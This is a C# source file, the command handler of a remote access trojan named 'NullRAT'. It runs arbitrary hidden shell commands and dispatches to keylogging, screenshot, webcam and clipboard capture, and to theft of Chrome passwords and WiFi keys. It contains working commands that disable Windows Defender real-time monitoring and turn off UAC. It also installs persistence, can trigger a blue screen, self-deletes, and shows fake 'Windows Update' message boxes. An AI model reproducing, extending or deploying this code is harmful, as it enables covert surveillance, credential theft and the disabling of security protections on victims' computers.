using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System.Windows.Forms;
using NullRAT.Features;

namespace NullRAT.Features
{
    public static class Commands
    {
        private static Keylogger _keylogger = new Keylogger();

        public static string Handle(string rawCommand)
        {
            try
            {
                string cmd = rawCommand.Trim();

                if (cmd.StartsWith("shell ")) return ExecuteShell(cmd.Substring(6));
                if (cmd.StartsWith("cd ")) return ChangeDirectory(cmd.Substring(3));
                if (cmd.StartsWith("messagebox ")) return ShowMessageBox(cmd.Substring(11));
                if (cmd.StartsWith("taskkill ")) return TaskKill(cmd.Substring(9));
                if (cmd.StartsWith("download ")) return FileManager.DownloadFile(cmd.Substring(9));

                string command = cmd.ToLower();

                switch (command)
                {
                    case "whoami": return $"{Environment.UserName}@{Environment.MachineName}";
                    case "sysinfo": return GetSystemInfo();
                    case "ls": case "dir": return string.Join("\n", Directory.GetFileSystemEntries(".", "*.*"));
                    case "pwd": return Directory.GetCurrentDirectory();
                    case "screenshot": return Screenshot.Capture();
                    case "webcam": return Webcam.Capture();
                    case "clipboard get": return ClipboardManager.Get();
                    case "clipboard clear": return ClipboardManager.Clear();
                    case "keylog_start": return _keylogger.Start();
                    case "keylog_stop": return _keylogger.Stop();
                    case "keylog_dump": return _keylogger.DumpLogs();
                    case "processes": case "tasklist": return ProcessManager.List();
                    case "drives": return string.Join("\n", DriveInfo.GetDrives().Select(d => $"{d.Name} [{d.VolumeLabel}] {d.DriveType}"));
                    case "wifi": return CredentialStealer.GetWiFiPasswords();
                    case "chrome": return CredentialStealer.StealChromePasswords();
                    case "reboot": Process.Start("shutdown", "/r /t 0"); return "Rebooting...";
                    case "shutdown": Process.Start("shutdown", "/s /t 0"); return "Shutting down...";
                    case "persistence": Persistence.Install(); return "Persistence reinforced.";
                    case "selfdestruct": return SelfDestruct();
                    case "disable_defender": return ExecuteShell("powershell -c \"Set-MpPreference -DisableRealtimeMonitoring \$true\"");
                    case "uac_off": return ExecuteShell("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
                    case "lock": return ExecuteShell("rundll32.exe user32.dll,LockWorkStation");
                    case "bsod": return BlueScreen.Trigger();
                    case "info": return GetDetailedInfo();

                    default: return ExecuteShell(cmd);
                }
            }
            catch (Exception ex)
            {
                return $"[ERROR] {ex.Message}";
            }
        }

        private static string ExecuteShell(string command)
        {
            Process p = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            p.Start();
            string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit();
            return string.IsNullOrWhiteSpace(output) ? "Command executed successfully." : output.Trim();
        }

        private static string ChangeDirectory(string path)
        {
            try
            {
                Directory.SetCurrentDirectory(path);
                return $"Working directory changed to: {Directory.GetCurrentDirectory()}";
            }
            catch (Exception ex) { return $"CD Error: {ex.Message}"; }
        }

        private static string ShowMessageBox(string text)
        {
            Task.Run(() => MessageBox.Show(text, "Windows Update", MessageBoxButtons.OK, MessageBoxIcon.Information));
            return "MessageBox displayed.";
        }

        private static string TaskKill(string name)
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName(name.Replace(".exe", "")))
                    proc.Kill();
                return $"Process(es) {name} killed.";
            }
            catch (Exception ex) { return $"TaskKill Error: {ex.Message}"; }
        }

        private static string SelfDestruct()
        {
            try
            {
                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                ExecuteShell($"timeout 3 && del \"{path}\" /f /q");
                Environment.Exit(0);
                return "Self-destruct successful.";
            }
            catch { return "Self-destruct failed."; }
        }

        private static string GetSystemInfo()
        {
            return $"OS: {Environment.OSVersion}\n" +
                   $"Arch: {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}\n" +
                   $"User: {Environment.UserName}\n" +
                   $"Machine: {Environment.MachineName}\n" +
                   $"Cores: {Environment.ProcessorCount}";
        }

        private static string GetDetailedInfo()
        {
            var info = new Microsoft.VisualBasic.Devices.ComputerInfo();
            return GetSystemInfo() + $"\nRAM: {info.TotalPhysicalMemory / (1024 * 1024 * 1024)} GB";
        }
    }
}